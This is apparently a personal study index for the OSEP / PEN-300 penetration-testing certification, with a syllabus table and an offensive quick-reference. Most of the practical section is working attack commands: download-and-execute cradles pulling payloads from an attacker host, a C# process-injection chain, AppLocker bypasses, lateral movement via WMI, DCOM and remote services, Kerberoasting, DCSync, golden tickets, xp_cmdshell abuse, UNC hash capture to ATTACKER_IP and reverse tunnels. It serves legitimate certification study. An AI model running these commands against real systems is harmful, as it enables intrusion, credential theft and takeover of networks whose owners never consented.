# OSEP — PEN-300

Study index for **OffSec Experienced Penetration Tester (OSEP)**, the certification tied to the **PEN-300: Evasion Techniques and Breaching Defenses** course.

OSEP is about getting a foothold and moving through a hardened environment when the easy paths are closed: defences are on, antivirus is watching, application control is enforced, and the network is segmented. The exam is a 48-hour hands-on assessment followed by a report.

> **NDA notice** — no exam content is reproduced here. Everything below comes from the public syllabus, community references, and personal study notes.

---

## Syllabus Domains

| # | Domain | What it covers |
|---|--------|---------------|
| 1 | OS and programming theory | Windows internals, PE basics, .NET, PowerShell, C# tooling |
| 2 | Client-side code execution | Office macros, HTA, Jscript phishing payloads |
| 3 | Process injection and migration | Injecting code between processes |
| 4 | Antivirus evasion | AMSI, ETW, signature and heuristic bypass |
| 5 | Application whitelisting | AppLocker, CLM, WDAC bypass paths |
| 6 | Bypassing network filters | Egress, proxy-aware C2, tunnelling |
| 7 | Linux post-exploitation | Enumeration and escalation on Linux |
| 8 | Kiosk breakouts | Escaping restricted desktop environments |
| 9 | Windows credentials | Credential theft, caching, and reuse |
| 10 | Windows lateral movement | WMI, DCOM, WinRM, PsExec, SCM |
| 11 | Linux lateral movement | SSH, cron, capabilities |
| 12 | MSSQL attacks | xp_cmdshell, linked servers, UNC injection |
| 13 | Active Directory exploitation | Kerberos, delegation, ACL abuse, trust paths |
| 14 | Combining the pieces | Full assumed-breach chains |

---

## Practical Quick-Reference

### File Transfer & Download Cradles

```powershell
# PowerShell IEX cradle
IEX (New-Object Net.WebClient).DownloadString('http://LHOST/run.ps1')

# WebRequest variant (useful when WebClient is blocked)
$r = [System.Net.WebRequest]::Create('http://LHOST/run.ps1')
IEX ([System.IO.StreamReader]($r.GetResponse().GetResponseStream())).ReadToEnd()

# certutil download
certutil -urlcache -split -f http://LHOST/payload.exe C:\Windows\Temp\p.exe

# bitsadmin transfer
bitsadmin /transfer job /download /priority high http://LHOST/p.exe C:\Windows\Temp\p.exe
```

### Process Injection — C# Pattern

The classic `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread` chain.  
You need these P/Invoke signatures in your C# loader:

```csharp
[DllImport("kernel32.dll")]
static extern IntPtr OpenProcess(uint access, bool inherit, int pid);

[DllImport("kernel32.dll")]
static extern IntPtr VirtualAllocEx(IntPtr hProc, IntPtr addr,
    uint size, uint allocType, uint protect);

[DllImport("kernel32.dll")]
static extern bool WriteProcessMemory(IntPtr hProc, IntPtr baseAddr,
    byte[] buf, uint size, out UIntPtr written);

[DllImport("kernel32.dll")]
static extern IntPtr CreateRemoteThread(IntPtr hProc, IntPtr threadAttr,
    uint stackSize, IntPtr startAddr, IntPtr param, uint flags, IntPtr threadId);
```

**Flow:**
1. `OpenProcess` target PID with `PROCESS_ALL_ACCESS` (0x001F0FFF)  
2. `VirtualAllocEx` with `MEM_COMMIT | MEM_RESERVE` (0x3000), `PAGE_EXECUTE_READWRITE` (0x40)  
3. `WriteProcessMemory` to copy your shellcode buf  
4. `CreateRemoteThread` pointing at the allocated address  

> Build this from scratch — the exam expects you to understand the API chain, not paste a template.

### AppLocker / CLM Bypass Paths

```
# InstallUtil — runs the Uninstall() method of a .NET assembly
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# MSBuild — inline task execution from an XML project file
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe inline.xml

# Common writable directories inside default AppLocker allow rules
C:\Windows\Tasks\
C:\Windows\System32\spool\drivers\color\
C:\Windows\Tracing\
```

### Lateral Movement

```powershell
# --- WMI ---
wmic /node:TARGET /user:DOMAIN\user /password:pass process call create "cmd /c whoami > C:\out.txt"

# --- WinRM / PSRemoting ---
$cred = Get-Credential
$s = New-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -Session $s -ScriptBlock { whoami; hostname }

# --- DCOM ShellWindows ---
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID(
    "9BA05972-F6A8-11CF-A442-00A0C90A8F39", "TARGET"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami > C:\out.txt","","",0)

# --- sc.exe service creation (PsExec-style) ---
sc \\TARGET create svcpwn binPath= "cmd /c powershell -ep bypass -f \\LHOST\share\run.ps1"
sc \\TARGET start svcpwn
```

### Kerberos Attacks

```powershell
# Kerberoasting — extract TGS hashes for offline cracking
.\Rubeus.exe kerberoast /outfile:tgs_hashes.txt

# AS-REP Roasting — accounts with pre-auth disabled
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Crack
hashcat -m 13100 tgs_hashes.txt wordlist.txt   # Kerberoast (RC4)
hashcat -m 18200 asrep.txt wordlist.txt         # AS-REP

# Unconstrained delegation — capture incoming TGTs
.\Rubeus.exe monitor /interval:5

# Constrained delegation — S4U impersonation
.\Rubeus.exe s4u /user:svc_acct /rc4:NTLM_HASH /impersonateuser:administrator /msdsspn:cifs/target /ptt

# DCSync — pull all hashes from the domain controller
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
```

### MSSQL Exploitation

```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- Enumerate linked servers
SELECT srvname, srvproduct FROM master..sysservers;

-- Execute on a linked server via RPC
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SRV]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SRV]
EXEC ('xp_cmdshell ''whoami'';') AT [LINKED_SRV]

-- UNC path injection for hash capture (use with Responder or ntlmrelayx)
EXEC xp_dirtree '\\ATTACKER_IP\share', 1, 1
```

### Domain Persistence

```powershell
# Golden Ticket — forged TGT using the krbtgt hash
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket — forged TGS for a specific service
mimikatz # kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /target:dc01.corp.local /service:cifs /rc4:SVC_HASH /ptt
```

### Tunnelling

```bash
# Ligolo-ng — fast, reliable double-pivot
# On attacker: start the proxy
./proxy -selfcert -laddr 0.0.0.0:11601

# On pivot host: connect back
./agent -connect ATTACKER:11601 -ignore-cert

# In ligolo console: add route and start
>> session
>> ifconfig           # note the internal subnet
>> start
# On attacker: add route
sudo ip route add 10.10.10.0/24 dev ligolo

# Chisel — SOCKS proxy
# Server (attacker)
./chisel server -p 8080 --reverse
# Client (pivot)
./chisel client ATTACKER:8080 R:1080:socks
# Then use proxychains with socks5 127.0.0.1 1080
```

---

## Prep Checklist

- [ ] Build a custom C# shellcode runner that bypasses current Defender signatures
- [ ] Full AD attack chain from scratch: enum → Kerberoast → lateral move → DA
- [ ] Write macro and HTA payloads by hand (no copy-paste from GitHub)
- [ ] MSSQL linked server pivoting across at least two hops
- [ ] At least 5 Proving Grounds or HTB AD boxes completed end-to-end
- [ ] Time-box a mock 48-hour run against the challenge labs
- [ ] Practice report writing: screenshots, commands, and the *why* for each step

---

## Key References

| Resource | Link |
|----------|------|
| Emmanuel Solis — OSEP Cheatsheet | [emmanuelsolis.com/osep](https://www.emmanuelsolis.com/osep.html) |
| OffSec — PEN-300 Syllabus | [offsec.com/courses/pen-300](https://www.offsec.com/courses/pen-300/) |
| OffSec — OSEP Exam Guide | [help.offsec.com](https://help.offsec.com/hc/en-us/articles/360050293792-OSEP-Exam-Guide) |
| PayloadsAllTheThings — AD Attacks | [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md) |
| HarmJ0y — Rubeus Wiki | [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) |
| Ligolo-ng | [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng) |
| Chvancoern — OSEP Prep | [chvancoern/OSEP-Prep](https://github.com/chvancoern/OSEP-Prep) |

---

_Topic notes will be added as `NN-topic.md` files (e.g. `03-process-injection.md`), each in my own words with the source linked._
